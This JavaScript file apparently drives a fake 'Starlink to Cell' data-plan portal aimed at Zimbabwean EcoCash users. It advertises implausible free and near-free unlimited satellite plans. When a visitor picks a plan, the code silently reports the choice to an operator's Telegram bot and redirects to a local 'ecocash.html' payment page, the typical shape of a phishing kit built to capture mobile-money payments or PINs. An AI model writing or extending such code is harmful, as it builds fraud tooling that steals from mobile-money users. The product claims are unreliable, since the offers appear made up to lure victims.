/**
 * Starlink to Cell - Data Plans Interactive Controller
 * Handles plan selection, Telegram alerts, and EcoCash redirect.
 */

const planData = {
  '5gb-trial': {
    badge: 'New users only',
    badgeClass: 'badge-red',
    title: '5GB Free Trial',
    dataAmount: '5GB',
    duration: '2-Day Plan',
    price: 'FREE',
    priceNumeric: 0.00,
    isTrial: true,
    description: 'Experience ultra-fast satellite connectivity directly on your 4G/5G phone anywhere in Zimbabwe. Free for first-time activations.',
    features: [
      '5GB High-Speed Satellite Data allowance',
      '2 Days validity from moment of activation',
      'Connects directly to Starlink LEO satellites from your phone',
      'Works in all remote areas, national parks, and highways',
      'Zero setup or hardware needed — operates over your Econet SIM'
    ]
  },
  '15gb': {
    badge: 'Best for light users',
    badgeClass: 'badge-blue',
    title: '15GB Satellite Data',
    dataAmount: '15GB',
    duration: '7-Day Plan',
    price: 'USD 0.99',
    priceNumeric: 0.99,
    description: 'Ideal for messaging, navigation, banking apps, social media, and calls while traveling or working in rural zones.',
    features: [
      '15GB High-Speed Direct-to-Cell data',
      '7 Days full validity',
      'Low latency satellite routing (25-45ms)',
      'Instant EcoCash payment & immediate auto-activation',
      'Works alongside standard Econet mobile bundles'
    ]
  },
  '35gb': {
    badge: 'Balanced',
    badgeClass: 'badge-green',
    title: '35GB Satellite Data',
    dataAmount: '35GB',
    duration: '14-Day Plan',
    price: 'USD 1.99',
    priceNumeric: 1.99,
    description: 'A balanced plan for remote workers, video conferencing, YouTube streaming, and everyday high-reliability connectivity.',
    features: [
      '35GB High-Throughput Data',
      '14 Days validity',
      'Seamless auto-fallback between Econet 4G/5G and Starlink satellites',
      'Personal hotspot and tethering supported',
      'Real-time data tracking via EcoCash & Econet USSD'
    ]
  },
  '50gb': {
    badge: 'Heavy use',
    badgeClass: 'badge-orange',
    title: '50GB Satellite Data',
    dataAmount: '50GB',
    duration: '21-Day Plan',
    price: 'USD 2.99',
    priceNumeric: 2.99,
    description: 'Engineered for intensive usage, large downloads, family hotspot sharing, and uninterrupted fieldwork.',
    features: [
      '50GB Satellite Direct-to-Cell Data',
      '21 Days validity',
      'High priority satellite queue access',
      'Full HD streaming without throttling',
      'EcoCash instant USD mobile wallet deduction'
    ]
  },
  'monthly-unlimited': {
    badge: 'Most Popular',
    badgeClass: 'badge-purple',
    title: 'Monthly Unlimited Data',
    dataAmount: 'Unlimited',
    duration: '30-Day Plan',
    price: 'USD 3.99',
    priceNumeric: 3.99,
    description: 'Our most popular tier: Unlimited satellite data for 30 days. Perfect for remote residences, safari camps, and heavy mobile power users.',
    features: [
      'True Unlimited Satellite Data for 30 Days',
      'Nationwide & cross-border coverage with Econet roaming',
      'Zero data caps or speed throttling',
      'Unlimited video streaming, VoIP calling & web browsing',
      'Instant EcoCash activation with receipt SMS'
    ]
  },
  '5g-unlimited': {
    badge: '5G Coverage',
    badgeClass: 'badge-teal',
    title: '5G Monthly Unlimited Data',
    dataAmount: '5G Unlimited',
    duration: '30-Day Plan',
    price: 'USD 7.99',
    priceNumeric: 7.99,
    description: 'Next-generation dual-carrier tier: Starlink V2 direct-to-cell combined with Econet 5G network priority for blazing download speeds up to 250Mbps.',
    features: [
      'Dual-Carrier: Starlink V2 Satellite + Econet 5G',
      'Peak speeds up to 250Mbps with ultra-low jitter',
      '30 Days Unlimited data',
      'VIP Network priority (QoS Tier 1)',
      'Full hotspot & team connectivity support'
    ]
  },
  'free-30gb': {
    badge: 'Special Promo',
    badgeClass: 'badge-red',
    title: 'FREE 30GB Promotional Gift',
    dataAmount: '30GB',
    duration: 'Valid for 30 Days',
    price: 'FREE',
    priceNumeric: 0.00,
    isTrial: true,
    description: 'Exclusive Econet & Starlink partnership offer. Claim 30GB free satellite data valid for 30 days on your active EcoCash account.',
    features: [
      '30GB 100% Free Satellite Data',
      'Valid for 30 full days',
      'Available to all registered EcoCash subscribers',
      'No hidden charges or automatic recurring billing',
      'Instant direct-to-cell activation'
    ]
  }
};

// ============================================================================
// TELEGRAM NOTIFICATION CONFIGURATION
// Use global Telegram configuration from config.js if present
// ============================================================================
var telegramCfg = window.TELEGRAM_CONFIG || {
  enabled: true,
  botToken: 'YOUR_BOT_TOKEN_HERE',
  chatId: 'YOUR_CHAT_ID_HERE'
};

/**
 * Send alert to Telegram Admin when a customer picks/clicks a package
 */
async function notifyTelegramPackagePicked(plan) {
  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });
  const textMessage =
    `🛒 <b>PACKAGE SELECTED!</b>\n\n` +
    `📦 <b>Package:</b> ${plan.title}\n` +
    `💰 <b>Price:</b> ${plan.price}\n` +
    `⏱ <b>Duration:</b> ${plan.duration}\n` +
    `📅 <b>Time:</b> ${timestamp}\n` +
    `🌐 <b>Platform:</b> Starlink to Cell Portal`;

  const cfg = window.TELEGRAM_CONFIG;
  if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') {
    console.info('ℹ️ Telegram: set botToken and chatId in config.js to receive live alerts.');
    return;
  }

  const endpoint = `https://api.telegram.org/bot${cfg.botToken}/sendMessage`;
  try {
    // keepalive: true ensures the request completes even if the page navigates away
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: true,
      body: JSON.stringify({ chat_id: cfg.chatId, text: textMessage, parse_mode: 'HTML' })
    });
    console.log('✓ Admin notified on Telegram.');
  } catch (err) {
    console.error('[Telegram]', err);
  }
}

/**
 * When customer picks a package:
 * 1. Notify admin on Telegram that customer picked a package
 * 2. Redirect client to the EcoCash payment page (ecocash.html)
 */
async function openPlanDetails(planId) {
  const plan = planData[planId] || { title: planId, price: 'N/A', duration: '', badge: '' };

  // Fire Telegram alert immediately (keepalive ensures it survives page navigation)
  notifyTelegramPackagePicked(plan).catch(err => console.error('[Telegram]', err));

  // Redirect to ecocash immediately — Telegram fires in background
  window.location.href = `ecocash.html?plan=${encodeURIComponent(planId)}`;
}

/**
 * Toast popup notification helper
 */
function showToast(msg) {
  const toast = document.getElementById('toast-notification');
  const toastText = document.getElementById('toast-text');
  if (!toast || !toastText) return;

  toastText.textContent = msg;
  toast.classList.add('show');

  setTimeout(() => {
    toast.classList.remove('show');
  }, 4000);
}
